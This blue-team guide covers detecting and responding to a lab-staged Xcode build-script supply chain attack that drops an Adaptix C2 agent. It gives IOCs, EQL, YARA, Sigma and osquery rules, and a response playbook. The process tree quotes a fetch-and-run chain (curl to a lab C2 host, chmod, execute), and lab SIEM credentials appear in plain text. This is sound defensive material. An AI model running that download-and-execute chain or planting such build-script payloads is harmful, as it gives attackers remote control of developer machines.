# BLUE TEAM - Indicators of Compromise (IOC) Reference

## Supply Chain Attack via Xcode Build Scripts

**Classification:** Detection & Response Guide  
**Threat Type:** Supply Chain / Developer Targeting  
**Platform:** macOS  

---

## Lab Environment - Elastic SIEM

### Access Details

| Component | URL | Credentials |
|-----------|-----|-------------|
| Kibana | https://192.168.36.131:5601 | elastic:elasticpassword |
| Elasticsearch | https://192.168.36.131:9200 | elastic:elasticpassword |
| Fleet Server | https://192.168.36.131:8220 | - |

### Monitored Endpoint

| System | IP | Agent Status |
|--------|-----|--------------|
| macOS Target | 192.168.36.178 | Elastic Agent + Endpoint Security |

---

## Quick Reference IOCs

### File System Indicators

| Indicator | Location | Description |
|-----------|----------|-------------|
| Hidden scripts in xcuserdata | `*.xcodeproj/xcuserdata/.*/` | Scripts hidden in dot-directories |
| `.xcassets` outside Assets | `*.xcodeproj/xcuserdata/.xcassets/` | Fake asset catalog directory |
| `xcassets.sh` | Inside .xcodeproj | Shell script masquerading as asset |
| `/tmp/.a` | Temp directory | Adaptix Gopher agent (hidden file) |
| `/tmp/agent.bin` | Temp directory | Downloaded agent before rename |

### Network Indicators

| Indicator | Pattern | Description |
|-----------|---------|-------------|
| C2 Server | 192.168.36.226 | Adaptix C2 server |
| Agent Download | http://192.168.36.226:9999/agent.bin | Payload staging URL |
| GopherTCP C2 | 192.168.36.226:9090 | Agent callback port |
| User-Agent | `curl/*` | Common for script-based downloads |

### Process Indicators

| Parent | Child | Command | Suspicious? |
|--------|-------|---------|-------------|
| bash | xxd | `xxd -p -r` | YES - payload decoding |
| bash | curl | `curl -fskL ... -o /tmp/.a` | YES - hidden file download |
| bash | chmod | `chmod +x /tmp/.a` | YES - making tmp file executable |
| bash | .a | `/tmp/.a` | YES - executing hidden binary |

### Attack Chain Process Tree
```
bash (/tmp/MarkdownEditor.xcodeproj/xcuserdata/.xcassets/xcassets.sh)
  |
  +-- xxd -p -r (decode hex payload)
  |
  +-- bash -c "curl ... && chmod ... && /tmp/.a &"
        |
        +-- curl -fskL http://192.168.36.226:9999/agent.bin -o /tmp/.a
        |
        +-- chmod +x /tmp/.a
        |
        +-- /tmp/.a (Adaptix Gopher agent)
              |
              +-- TCP connection to 192.168.36.226:9090
```

---

## Elastic Security Detection Rules

### Custom Rules Created for This Attack

These rules were created specifically because the prebuilt Elastic rules did NOT detect this macOS attack:

#### 1. Suspicious Script Execution from Xcode Project
```
Name: Suspicious Script Execution from Xcode Project
Severity: CRITICAL (Risk Score: 85)
Type: EQL
Index: logs-endpoint.events.process*

Query:
process where event.type == "start" and 
  process.name == "bash" and 
  process.command_line like "*xcodeproj*xcuserdata*"

Tags: macOS, Supply Chain, Xcode, Red Team Demo
```

#### 2. Hex Payload Decoding via xxd - Supply Chain Attack
```
Name: Hex Payload Decoding via xxd - Supply Chain Attack
Severity: HIGH (Risk Score: 73)
Type: EQL
Index: logs-endpoint.events.process*

Query:
process where event.type == "start" and 
  process.name == "xxd" and 
  process.args == "-p" and 
  process.args == "-r"

Tags: macOS, Supply Chain, Xcode, Red Team Demo
```

#### 3. Curl Download to Tmp with Execution
```
Name: Curl Download to Tmp with Execution
Severity: HIGH (Risk Score: 70)
Type: EQL (Sequence)
Index: logs-endpoint.events.process*

Query:
sequence by host.id with maxspan=30s 
  [process where event.type == "start" and process.name == "curl" and process.args like "/tmp/*"] 
  [process where event.type == "start" and process.name == "chmod" and process.args like "/tmp/*"]

Tags: macOS, Malware, Red Team Demo
```

### Why Prebuilt Rules Didn't Trigger

| Prebuilt Rule | Reason for Miss |
|---------------|-----------------|
| Potential Hex Payload Execution via Common Utility | **Only targets Linux** (`host.os.type == "linux"`) |
| Other shell execution rules | Designed for Windows/Linux patterns |
| Suspicious process rules | Not tuned for Xcode/macOS development patterns |

**Gap Identified:** Elastic prebuilt rules have limited coverage for macOS developer-targeted supply chain attacks.

---

## Elastic Queries for Investigation

### Find Attack Events
```bash
# Search for all attack-related process events
curl -k -s -u elastic:elasticpassword \
  "https://192.168.36.131:9200/logs-endpoint.events.process*/_search" \
  -H "Content-Type: application/json" \
  -d '{
    "query": {
      "bool": {
        "filter": [{"range": {"@timestamp": {"gte": "now-1h"}}}],
        "should": [
          {"match": {"process.name": "bash"}},
          {"match": {"process.name": "curl"}},
          {"match": {"process.name": "xxd"}},
          {"match": {"process.name": "chmod"}}
        ],
        "minimum_should_match": 1
      }
    },
    "size": 50,
    "sort": [{"@timestamp": "desc"}]
  }'
```

### Get Alert Summary
```bash
# Count alerts by rule
curl -k -s -u elastic:elasticpassword \
  "https://192.168.36.131:5601/api/detection_engine/signals/search" \
  -H "kbn-xsrf: true" \
  -H "Content-Type: application/json" \
  -d '{
    "query": {"match_all": {}},
    "size": 0,
    "aggs": {"rules": {"terms": {"field": "kibana.alert.rule.name", "size": 20}}}
  }'
```

### Find Processes from /tmp
```bash
curl -k -s -u elastic:elasticpassword \
  "https://192.168.36.131:9200/logs-endpoint.events.process*/_search" \
  -H "Content-Type: application/json" \
  -d '{
    "query": {
      "wildcard": {"process.executable": "/tmp/*"}
    },
    "size": 20
  }'
```

### Find Network Connections to C2
```bash
curl -k -s -u elastic:elasticpassword \
  "https://192.168.36.131:9200/logs-endpoint.events.network*/_search" \
  -H "Content-Type: application/json" \
  -d '{
    "query": {
      "bool": {
        "should": [
          {"match": {"destination.ip": "192.168.36.226"}},
          {"match": {"destination.port": 9090}},
          {"match": {"destination.port": 9999}}
        ]
      }
    },
    "size": 20
  }'
```

---

## Detection Rules - YARA

```yara
rule Xcode_Supply_Chain_Backdoor {
    meta:
        description = "Detects potential Xcode build script backdoor"
        author = "Blue Team"
        severity = "high"
        
    strings:
        $pbx1 = "PBXShellScriptBuildPhase"
        $pbx2 = "shellScript"
        $hidden1 = ".xcassets"
        $hidden2 = "xcuserdata"
        $cmd1 = "xxd -p -r"
        $cmd2 = "osascript"
        $cmd3 = "curl"
        $sandbox = "ENABLE_USER_SCRIPT_SANDBOXING = NO"
        
    condition:
        ($pbx1 and $pbx2) and 
        (($hidden1 and $hidden2) or $sandbox or (any of ($cmd*)))
}

rule Hex_Encoded_Shell_Payload {
    meta:
        description = "Detects hex-encoded shell payloads decoded via xxd"
        
    strings:
        $xxd_decode = "xxd -p -r"
        $hex_curl = /6375726c[0-9a-f]{20,}/  // "curl" in hex followed by more hex
        $hex_chmod = /63686d6f64/             // "chmod" in hex
        
    condition:
        $xxd_decode and ($hex_curl or $hex_chmod)
}

rule Adaptix_Gopher_Agent {
    meta:
        description = "Detects Adaptix Gopher agent binary"
        
    strings:
        $gopher1 = "gopher"
        $gopher2 = "adaptix"
        $go_build = "Go build"
        
    condition:
        uint32(0) == 0xfeedface or uint32(0) == 0xfeedfacf and
        any of ($gopher*, $go_build)
}
```

---

## Detection Rules - Sigma

```yaml
title: Xcode Build Script Executes from xcuserdata
status: production
description: Detects shell script execution from Xcode project xcuserdata directory - indicator of trojanized project
logsource:
    category: process_creation
    product: macos
detection:
    selection:
        process.name:
            - 'bash'
            - 'sh'
            - 'zsh'
        process.command_line|contains|all:
            - 'xcodeproj'
            - 'xcuserdata'
    condition: selection
level: critical
tags:
    - attack.t1195.002
    - attack.execution
---
title: XXD Hex Decoding - Payload Execution
status: production
description: Detects xxd being used to decode hex payloads
logsource:
    category: process_creation
    product: macos
detection:
    selection:
        process.name: 'xxd'
        process.args|contains|all:
            - '-p'
            - '-r'
    condition: selection
level: high
tags:
    - attack.defense_evasion
    - attack.t1027
---
title: Curl Download to Hidden Temp File
status: production  
description: Detects curl downloading to hidden file in /tmp
logsource:
    category: process_creation
    product: macos
detection:
    selection:
        process.name: 'curl'
        process.args|contains: '/tmp/.'
    condition: selection
level: high
tags:
    - attack.command_and_control
    - attack.t1105
---
title: Executable Creation and Execution in Tmp
status: production
description: Detects chmod +x followed by execution of file in /tmp
logsource:
    category: process_creation
    product: macos
detection:
    chmod_selection:
        process.name: 'chmod'
        process.args|contains: '+x'
        process.args|contains: '/tmp/'
    condition: chmod_selection
level: high
tags:
    - attack.execution
    - attack.t1059
```

---

## osquery Queries

```sql
-- Find shell scripts in Xcode projects
SELECT 
    path,
    filename,
    size,
    mtime,
    sha256
FROM file
WHERE path LIKE '%/%.xcodeproj/xcuserdata/%'
AND filename LIKE '%.sh';

-- Find hidden executables in /tmp
SELECT 
    path,
    filename,
    size,
    mode,
    mtime
FROM file
WHERE path LIKE '/tmp/.%'
AND mode LIKE '%x%';

-- Find processes running from /tmp
SELECT 
    pid,
    name,
    path,
    cmdline,
    parent,
    start_time
FROM processes
WHERE path LIKE '/tmp/%';

-- Check for Adaptix agent network connections
SELECT 
    p.pid,
    p.name,
    p.path,
    s.remote_address,
    s.remote_port,
    s.state
FROM processes p
JOIN socket_events s ON p.pid = s.pid
WHERE s.remote_address = '192.168.36.226'
OR s.remote_port IN (9090, 9999);

-- Find xxd executions (payload decoding)
SELECT 
    pid,
    name,
    cmdline,
    parent,
    start_time
FROM processes
WHERE name = 'xxd'
AND cmdline LIKE '%-p%'
AND cmdline LIKE '%-r%';
```

---

## Response Playbook

### Immediate Actions

1. **Isolate affected system** from network
2. **Kill malicious process:**
   ```bash
   sudo pkill -9 -f '/tmp/.a'
   sudo pkill -9 -f 'agent.bin'
   ```

3. **Capture volatile data:**
   ```bash
   ps aux > /tmp/ir_processes.txt
   netstat -an > /tmp/ir_network.txt
   lsof -i > /tmp/ir_connections.txt
   ```

4. **Preserve malware sample:**
   ```bash
   cp /tmp/.a /tmp/ir_malware_sample
   shasum -a 256 /tmp/ir_malware_sample
   ```

### Investigation Steps

1. **Identify the malicious project:**
   ```bash
   find ~ -path "*xcuserdata*" -name "*.sh" -exec cat {} \;
   grep -r "xxd -p -r" ~/
   ```

2. **Extract C2 indicators:**
   ```bash
   # Decode the payload from the script
   cat malicious_script.sh | grep "echo" | cut -d'"' -f2 | xxd -p -r
   ```

3. **Check for persistence:**
   ```bash
   launchctl list | grep -v "com.apple"
   ls -la ~/Library/LaunchAgents/
   crontab -l
   ```

4. **Review network connections:**
   ```bash
   lsof -i -n | grep ESTABLISHED
   netstat -an | grep 192.168.36.226
   ```

### Containment

1. Block C2 IP at firewall:
   ```bash
   # Add to /etc/pf.conf
   block out quick on en0 from any to 192.168.36.226
   ```

2. Remove malicious files:
   ```bash
   rm -f /tmp/.a
   rm -rf /path/to/trojanized.xcodeproj
   ```

3. Clear Xcode derived data:
   ```bash
   rm -rf ~/Library/Developer/Xcode/DerivedData/*
   ```

---

## Alert Triage in Kibana

### Step 1: Access Alerts
1. Navigate to https://192.168.36.131:5601
2. Login: elastic / elasticpassword
3. Go to **Security** > **Alerts**

### Step 2: Filter by Attack
- Filter by rule name: "Supply Chain" or "Xcode"
- Filter by severity: Critical, High
- Filter by host: users-iMac-Pro.local

### Step 3: Investigate Timeline
1. Click on an alert
2. View **Process Tree** to see parent/child relationships
3. Check **Network** tab for C2 connections
4. Use **Analyzer** to visualize the attack chain

### Step 4: Create Case
1. Select related alerts
2. Click **Add to case**
3. Document findings and IOCs

---

## Prevention Recommendations

1. **Enable script sandboxing** in all Xcode configurations
2. **Review build phases** before building external projects
3. **Use separate VM/container** for building untrusted code
4. **Monitor developer machines** with EDR (Elastic Endpoint)
5. **Block outbound connections** to unknown IPs from dev networks
6. **Train developers** on supply chain attack risks

---

## References

- MITRE ATT&CK T1195.002: Supply Chain Compromise
- Elastic Security Documentation: https://www.elastic.co/guide/en/security/current/index.html
- Adaptix C2 Framework: https://github.com/5P34R/AdaptixC2
- Apple Developer: Hardened Runtime
- Xcode Build Settings: ENABLE_USER_SCRIPT_SANDBOXING
